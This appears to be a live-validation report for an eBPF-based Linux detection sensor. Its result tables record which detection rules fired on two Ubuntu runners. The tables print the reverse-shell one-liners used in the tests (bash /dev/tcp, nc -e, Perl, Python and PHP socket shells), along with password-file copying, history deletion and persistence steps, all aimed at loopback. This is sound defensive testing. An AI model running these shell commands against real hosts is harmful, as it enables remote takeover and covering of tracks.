# Live validation: Linux eBPF source (no Sysmon)

**In plain words:** on fresh Linux machines run by GitHub, ZAAFVesper ran as root with its own eBPF event source and no
Sysmon installed. Its kernel programs passed all 10 live tests on both Ubuntu images, and the same harmless attack
simulations as the Sysmon run ([linux.md](linux.md)) were replayed. **Ubuntu 24.04: 16 of 16 Linux rules fired. Ubuntu
26.04: 13 of 16**, the same three SigmaHQ rules as with Sysmon, which look for `rm` and `cp` while Ubuntu 26.04 runs
`gnurm` and `gnucp`; ZAAFVesper's own rules for the same behaviour still fired. No event was lost: `events_missed=0` and
`seq_gaps=0` on both runners.

> **Validated on GitHub runners, not on your server.** The runners are throw-away `ubuntu-24.04` (kernel
> 7.0.0-1017-azure) and `ubuntu-latest` (Ubuntu 26.04, kernel 7.0.0-1019-azure) machines. Other kernels and
> distributions will differ; the source needs BTF (`/sys/kernel/btf/vmlinux`).

**Run:** <https://github.com/rifqifitriady/ZAAFVesper/actions/runs/42649231114> (commit `ad6913b`, workflow
`.github/workflows/live-linux-ebpf.yml`). The committed eBPF objects were checked byte for byte against `zaaf.bpf.c` in
run 42649231086 (workflow `.github/workflows/ebpf-objects.yml`).

## What the live runs found

- **Compressed kernel modules (fixed).** kmod 31 on these kernels loads `.ko.zst` files with `finit_module` and
  in-kernel decompression. The kernel then reports the read as `READING_MODULE_COMPRESSED` (id 7), not `READING_MODULE`
  (id 2), so the first run (42624894656) saw module loads without a path or source. A bpftrace probe on a runner
  confirmed the id. Both ids are now accepted (the compressed one only where the kernel defines it), and
  `TestLiveKernelModule` checks `module_source=file` and the `.ko` path.

## Kernel-program tests (root, must not skip)

| Test | ubuntu-24.04 | ubuntu-latest (26.04) |
|---|---|---|
| `TestLiveProcessLifecycle` | pass | pass |
| `TestLiveParentIsThreadGroup` | pass | pass |
| `TestLiveFiles` | pass | pass |
| `TestLiveOpenOnlyWhenSubscribed` | pass | pass |
| `TestLiveSetUID` | pass | pass |
| `TestLiveProcessAccess` | pass | pass |
| `TestLiveTCP` | pass | pass |
| `TestLiveDNS` | pass | pass |
| `TestLiveKernelModule` | pass | pass |
| `TestLiveDropsAreCounted` | pass | pass |

## Ubuntu 24.04

Run: https://github.com/rifqifitriady/ZAAFVesper/actions/runs/42649231114

16 rules for linux: **16 fired**, **0 fired for some tests only**, **0 did not fire**, **0 not tested**.

| Rule | Result | Tests | Detail |
|---|---|---|---|
| Copy Passwd Or Shadow From TMP Path<br>`rules/sigma/linux/proc_creation_lnx_cp_passwd_or_shadow_tmp.yml` | fired | inline-cp-passwd-tmp: fired (alert 15:55:42.580, test 15:55:42.577–15:55:42.581) | /usr/bin/cp (pid 7586, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun) ran: cp /etc/passwd /tmp/zaafvesper-passwd (Sigma rule by Joseliyo Sanchez, @Joseliyo_Jstnk) |
| Cron job file created<br>`rules/linux/persistence_cron_file_write.yml` | fired | art-T1053.003-078e69eb: fired (alert 15:55:15.227, test 15:55:15.225–15:55:15.227), art-T1053.003-2d943c18: fired (alert 15:55:17.233, test 15:55:17.231–15:55:17.233) | /usr/bin/dash (pid 7210, user root) created cron file /etc/cron.d/persistevil |
| History File Deletion<br>`rules/sigma/linux/proc_creation_lnx_susp_history_delete.yml` | fired | art-T1070.003-a934276e: fired (alert 15:55:22.361, test 15:55:22.360–15:55:22.362) | /usr/bin/rm (pid 7467, parent /usr/bin/dash) ran: rm /root/.bash_history (Sigma rule by Florian Roth (Nextron Systems)) |
| Interactive shell redirected to a network socket<br>`rules/linux/execution_reverse_shell_dev_tcp.yml` | fired | inline-bash-dev-tcp: fired (alert 15:55:26.372, test 15:55:26.371–15:55:30.378) | /usr/bin/bash (pid 7473, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun, user root) reverse shell: /bin/bash -c (timeout 6 nc -6 -l ::1 4444 >/dev/null 2>&1 &); sleep 1; timeout 3 bash -c 'bash -i >& /dev/tc… |
| Linux HackTool Execution<br>`rules/sigma/linux/proc_creation_lnx_susp_hktl_execution.yml` | fired | canary-start: fired (alert 15:55:13.220, test 15:55:13.215–15:55:13.221), inline-hacktool-name: fired (alert 15:55:44.590, test 15:55:44.585–15:55:44.591), canary-end: fired (alert 15:55:57.058, test 15:55:57.052–1… | /tmp/zaafvesper/canary/nuclei (pid 7206, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun) ran: /tmp/zaafvesper/canary/nuclei -c true (Sigma rule by Nasreddine Bencherchali (Nextron Systems), Georg Lauenstein … |
| Linux Reverse Shell Indicator<br>`rules/sigma/linux/net_connection_lnx_back_connect_shell_dev.yml` | fired | inline-bash-dev-tcp: fired (alert 15:55:27.379, test 15:55:26.371–15:55:30.378) | /usr/bin/bash (pid 7480) outbound connection ::1:50672 -> ::1:4444 (Sigma rule by Florian Roth (Nextron Systems)) |
| Linux Webshell Indicators<br>`rules/sigma/linux/proc_creation_lnx_webshell_detection.yml` | fired | inline-webshell-parent: fired (alert 15:55:55.046, test 15:55:54.037–15:55:55.047) | /usr/bin/whoami (pid 7628, parent /tmp/zaafvesper/nginx) ran: /usr/bin/whoami (Sigma rule by Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)) |
| Potential Netcat Reverse Shell Execution<br>`rules/sigma/linux/proc_creation_lnx_netcat_reverse_shell.yml` | fired | inline-netcat-e: fired (alert 15:55:32.382, test 15:55:32.379–15:55:32.383) | /usr/bin/nc.openbsd (pid 7573, parent /usr/bin/timeout) ran: nc -e /bin/sh 127.0.0.1 4444 (Sigma rule by @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)) |
| Potential PHP Reverse Shell<br>`rules/sigma/linux/proc_creation_lnx_php_reverse_shell.yml` | fired | inline-php-fsockopen: fired (alert 15:55:38.523, test 15:55:38.520–15:55:38.572) | /usr/bin/php8.3 (pid 7582, parent /usr/bin/timeout) ran: php -r $sock=fsockopen("127.0.0.1",4447);exec("/bin/sh -i <&3 >&3 2>&3"); (Sigma rule by @d4ns4n_) |
| Potential Perl Reverse Shell Execution<br>`rules/sigma/linux/proc_creation_lnx_perl_reverse_shell.yml` | fired | inline-perl-socket: fired (alert 15:55:34.388, test 15:55:34.385–15:55:34.400) | /usr/bin/perl (pid 7576, parent /usr/bin/timeout) ran: perl -e use Socket;$i="127.0.0.1";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STD… |
| Python Reverse Shell Execution Via PTY And Socket Modules<br>`rules/sigma/linux/proc_creation_lnx_python_reverse_shell.yml` | fired | inline-python-pty: fired (alert 15:55:36.405, test 15:55:36.401–15:55:36.518) | /usr/bin/python3.12 (pid 7579, parent /usr/bin/timeout) ran: python3 -c import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4446));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh") (Sigma rule by @d… |
| Shell history file deleted<br>`rules/linux/stealth_shell_history_deleted.yml` | fired | art-T1070.003-a934276e: fired (alert 15:55:22.361, test 15:55:22.360–15:55:22.362) | /usr/bin/rm (pid 7467, user root) deleted /root/.bash_history |
| Sudoers file created outside visudo<br>`rules/linux/privilege_escalation_sudoers_file_write.yml` | fired | inline-sudoers-dropin: fired (alert 15:55:24.367, test 15:55:24.363–15:55:24.367) | /usr/bin/tee (pid 7471, user root) wrote /etc/sudoers.d/zaafvesper-validation |
| Suspicious Java Children Processes<br>`rules/sigma/linux/proc_creation_lnx_susp_java_children.yml` | fired | inline-java-child: fired (alert 15:55:48.979, test 15:55:46.595–15:55:52.033) | /usr/bin/dash (pid 7619, parent /usr/lib/jvm/temurin-17-jdk-amd64/bin/java) ran: /bin/sh -c id (Sigma rule by Nasreddine Bencherchali (Nextron Systems)) |
| Syslog Clearing or Removal Via System Utilities<br>`rules/sigma/linux/proc_creation_lnx_clear_syslog.yml` | fired | inline-syslog-rm: fired (alert 15:55:40.575, test 15:55:40.573–15:55:40.576) | /usr/bin/rm (pid 7584, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun) ran: rm -f /var/log/syslog.zaafvesper-validation (Sigma rule by Max Altgelt (Nextron Systems), Roberto Rodriguez (Cyb3rWard0g), OTR (Ope… |
| Systemd unit file created outside the package manager<br>`rules/linux/persistence_systemd_unit_file_write.yml` | fired | art-T1543.002-d9e4f24f: fired (alert 15:55:19.240, test 15:55:19.238–15:55:19.809) | /usr/bin/bash (pid 7216, user root) created systemd unit /etc/systemd/system/art-systemd-service.service |

### Tests run

| Test | Kind | Exit | Note |
|---|---|---|---|
| canary-start  | inline | 0 | Canary: a bash copy named nuclei. It proves the sensor receives and evaluates events at this point of the run, independent of which coreutils the image ships. |
| art-T1053.003-078e69eb Cron - Add script to /etc/cron.d folder | atomic | 0 |  |
| art-T1053.003-2d943c18 Cron - Add script to /var/spool/cron/crontabs/ folder | atomic | 0 |  |
| art-T1543.002-d9e4f24f Create Systemd Service | atomic | 0 |  |
| art-T1070.003-a934276e Clear Bash history (rm) | atomic | 0 | The setup moves any existing history file aside and creates an empty one, so the test deletes only that; the teardown puts the original back. |
| inline-sudoers-dropin  | inline | 0 | A comment-only drop-in, removed right after. |
| inline-bash-dev-tcp  | inline | 0 | Loopback only (::1). The Sigma rule excludes 127.0.0.1 and 0.0.0.0 but not ::1, so an IPv6 loopback connection still exercises it; nothing leaves the machine. |
| inline-netcat-e  | inline | 0 | The runner's nc (OpenBSD) refuses -e; the command line is what the rule checks. |
| inline-perl-socket  | inline | 0 | Closed local port: the connection fails. |
| inline-python-pty  | inline | 0 | Closed local port: the connection fails. |
| inline-php-fsockopen  | inline | 0 | Closed local port. Needs php on the runner image. |
| inline-syslog-rm  | inline | 0 | Removes a file that does not exist; the command line is what the rule checks. |
| inline-cp-passwd-tmp  | inline | 0 |  |
| inline-hacktool-name  | inline | 0 | /bin/true copied under a scanner's name. |
| inline-java-child  | inline | 0 | Needs a JDK on the runner image (single-file source launch). The JVM stays up 3 s after its child, as a server would: Sysmon for Linux reports the forking thread as the parent, and the sensor maps it to the JVM through /… |
| inline-webshell-parent  | inline | 0 | bash copied under the name nginx starts whoami a second after it starts, as a running web server with a webshell would. (Without the pause, Sysmon for Linux can report the child before the parent's exec, so the parent st… |
| canary-end  | inline | 0 | Canary: a bash copy named nuclei. It proves the sensor receives and evaluates events at this point of the run, independent of which coreutils the image ships. |

## Ubuntu 26.04 (ubuntu-latest)

Run: https://github.com/rifqifitriady/ZAAFVesper/actions/runs/42649231114

16 rules for linux: **13 fired**, **0 fired for some tests only**, **3 did not fire**, **0 not tested**.

| Rule | Result | Tests | Detail |
|---|---|---|---|
| Cron job file created<br>`rules/linux/persistence_cron_file_write.yml` | fired | art-T1053.003-078e69eb: fired (alert 15:55:36.085, test 15:55:36.083–15:55:36.085), art-T1053.003-2d943c18: fired (alert 15:55:38.091, test 15:55:38.089–15:55:38.092) | /usr/bin/dash (pid 7314, user root) created cron file /etc/cron.d/persistevil |
| Interactive shell redirected to a network socket<br>`rules/linux/execution_reverse_shell_dev_tcp.yml` | fired | inline-bash-dev-tcp: fired (alert 15:55:47.531, test 15:55:47.530–15:55:51.542) | /usr/bin/bash (pid 7614, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun, user root) reverse shell: /bin/bash -c (timeout 6 nc -6 -l ::1 4444 >/dev/null 2>&1 &); sleep 1; timeout 3 bash -c 'bash -i >& /dev/tc… |
| Linux HackTool Execution<br>`rules/sigma/linux/proc_creation_lnx_susp_hktl_execution.yml` | fired | canary-start: fired (alert 15:55:34.077, test 15:55:34.068–15:55:34.078), inline-hacktool-name: fired (alert 15:56:05.794, test 15:56:05.785–15:56:05.794), canary-end: fired (alert 15:56:16.595, test 15:56:16.585–1… | /tmp/zaafvesper/canary/nuclei (pid 7309, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun) ran: /tmp/zaafvesper/canary/nuclei -c true (Sigma rule by Nasreddine Bencherchali (Nextron Systems), Georg Lauenstein … |
| Linux Reverse Shell Indicator<br>`rules/sigma/linux/net_connection_lnx_back_connect_shell_dev.yml` | fired | inline-bash-dev-tcp: fired (alert 15:55:48.541, test 15:55:47.530–15:55:51.542) | /usr/bin/bash (pid 7621) outbound connection ::1:56928 -> ::1:4444 (Sigma rule by Florian Roth (Nextron Systems)) |
| Linux Webshell Indicators<br>`rules/sigma/linux/proc_creation_lnx_webshell_detection.yml` | fired | inline-webshell-parent: fired (alert 15:56:14.578, test 15:56:13.565–15:56:14.581) | /usr/lib/cargo/bin/coreutils/whoami (pid 7769, parent /tmp/zaafvesper/nginx) ran: /usr/bin/whoami (Sigma rule by Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)) |
| Potential Netcat Reverse Shell Execution<br>`rules/sigma/linux/proc_creation_lnx_netcat_reverse_shell.yml` | fired | inline-netcat-e: fired (alert 15:55:53.547, test 15:55:53.542–15:55:53.549) | /usr/bin/nc.openbsd (pid 7718, parent /usr/lib/cargo/bin/coreutils/timeout) ran: nc -e /bin/sh 127.0.0.1 4444 (Sigma rule by @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)) |
| Potential PHP Reverse Shell<br>`rules/sigma/linux/proc_creation_lnx_php_reverse_shell.yml` | fired | inline-php-fsockopen: fired (alert 15:55:59.710, test 15:55:59.705–15:55:59.773) | /usr/bin/php8.5 (pid 7727, parent /usr/lib/cargo/bin/coreutils/timeout) ran: php -r $sock=fsockopen("127.0.0.1",4447);exec("/bin/sh -i <&3 >&3 2>&3"); (Sigma rule by @d4ns4n_) |
| Potential Perl Reverse Shell Execution<br>`rules/sigma/linux/proc_creation_lnx_perl_reverse_shell.yml` | fired | inline-perl-socket: fired (alert 15:55:55.555, test 15:55:55.549–15:55:55.585) | /usr/bin/perl (pid 7721, parent /usr/lib/cargo/bin/coreutils/timeout) ran: perl -e use Socket;$i="127.0.0.1";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(S… |
| Python Reverse Shell Execution Via PTY And Socket Modules<br>`rules/sigma/linux/proc_creation_lnx_python_reverse_shell.yml` | fired | inline-python-pty: fired (alert 15:55:57.591, test 15:55:57.586–15:55:57.703) | /usr/bin/python3.14 (pid 7724, parent /usr/lib/cargo/bin/coreutils/timeout) ran: python3 -c import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4446));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh… |
| Shell history file deleted<br>`rules/linux/stealth_shell_history_deleted.yml` | fired | art-T1070.003-a934276e: fired (alert 15:55:43.519, test 15:55:43.517–15:55:43.519) | /usr/bin/gnurm (pid 7607, user root) deleted /root/.bash_history |
| Sudoers file created outside visudo<br>`rules/linux/privilege_escalation_sudoers_file_write.yml` | fired | inline-sudoers-dropin: fired (alert 15:55:45.526, test 15:55:45.521–15:55:45.527) | /usr/lib/cargo/bin/coreutils/tee (pid 7612, user root) wrote /etc/sudoers.d/zaafvesper-validation |
| Suspicious Java Children Processes<br>`rules/sigma/linux/proc_creation_lnx_susp_java_children.yml` | fired | inline-java-child: fired (alert 15:56:08.537, test 15:56:07.798–15:56:11.561) | /usr/bin/dash (pid 7760, parent /usr/lib/jvm/temurin-25-jdk-amd64/bin/java) ran: /bin/sh -c id (Sigma rule by Nasreddine Bencherchali (Nextron Systems)) |
| Systemd unit file created outside the package manager<br>`rules/linux/persistence_systemd_unit_file_write.yml` | fired | art-T1543.002-d9e4f24f: fired (alert 15:55:40.098, test 15:55:40.097–15:55:40.828) | /usr/bin/bash (pid 7320, user root) created systemd unit /etc/systemd/system/art-systemd-service.service |
| Copy Passwd Or Shadow From TMP Path<br>`rules/sigma/linux/proc_creation_lnx_cp_passwd_or_shadow_tmp.yml` | did not fire | inline-cp-passwd-tmp: did not fire (test 15:56:03.778–15:56:03.782) | Known reason: on Ubuntu 26.04 cp runs as /usr/bin/gnucp; the SigmaHQ rule matches only images ending in /cp. |
| History File Deletion<br>`rules/sigma/linux/proc_creation_lnx_susp_history_delete.yml` | did not fire | art-T1070.003-a934276e: did not fire (test 15:55:43.517–15:55:43.519) | Known reason: on Ubuntu 26.04 rm runs as /usr/bin/gnurm; the SigmaHQ rule matches only images ending in /rm, /unlink or /shred. The hand-written rule 'Shell history file deleted' (file event) still fires. |
| Syslog Clearing or Removal Via System Utilities<br>`rules/sigma/linux/proc_creation_lnx_clear_syslog.yml` | did not fire | inline-syslog-rm: did not fire (test 15:56:01.773–15:56:01.776) | Known reason: on Ubuntu 26.04 rm runs as /usr/bin/gnurm (the Rust coreutils switch keeps GNU rm under that name); the SigmaHQ rule matches only images ending in /rm. |

### Tests run

| Test | Kind | Exit | Note |
|---|---|---|---|
| canary-start  | inline | 0 | Canary: a bash copy named nuclei. It proves the sensor receives and evaluates events at this point of the run, independent of which coreutils the image ships. |
| art-T1053.003-078e69eb Cron - Add script to /etc/cron.d folder | atomic | 0 |  |
| art-T1053.003-2d943c18 Cron - Add script to /var/spool/cron/crontabs/ folder | atomic | 0 |  |
| art-T1543.002-d9e4f24f Create Systemd Service | atomic | 0 |  |
| art-T1070.003-a934276e Clear Bash history (rm) | atomic | 0 | The setup moves any existing history file aside and creates an empty one, so the test deletes only that; the teardown puts the original back. |
| inline-sudoers-dropin  | inline | 0 | A comment-only drop-in, removed right after. |
| inline-bash-dev-tcp  | inline | 0 | Loopback only (::1). The Sigma rule excludes 127.0.0.1 and 0.0.0.0 but not ::1, so an IPv6 loopback connection still exercises it; nothing leaves the machine. |
| inline-netcat-e  | inline | 0 | The runner's nc (OpenBSD) refuses -e; the command line is what the rule checks. |
| inline-perl-socket  | inline | 0 | Closed local port: the connection fails. |
| inline-python-pty  | inline | 0 | Closed local port: the connection fails. |
| inline-php-fsockopen  | inline | 0 | Closed local port. Needs php on the runner image. |
| inline-syslog-rm  | inline | 0 | Removes a file that does not exist; the command line is what the rule checks. |
| inline-cp-passwd-tmp  | inline | 0 |  |
| inline-hacktool-name  | inline | 0 | /bin/true copied under a scanner's name. |
| inline-java-child  | inline | 0 | Needs a JDK on the runner image (single-file source launch). The JVM stays up 3 s after its child, as a server would: Sysmon for Linux reports the forking thread as the parent, and the sensor maps it to the JVM through /… |
| inline-webshell-parent  | inline | 0 | bash copied under the name nginx starts whoami a second after it starts, as a running web server with a webshell would. (Without the pause, Sysmon for Linux can report the child before the parent's exec, so the parent st… |
| canary-end  | inline | 0 | Canary: a bash copy named nuclei. It proves the sensor receives and evaluates events at this point of the run, independent of which coreutils the image ships. |
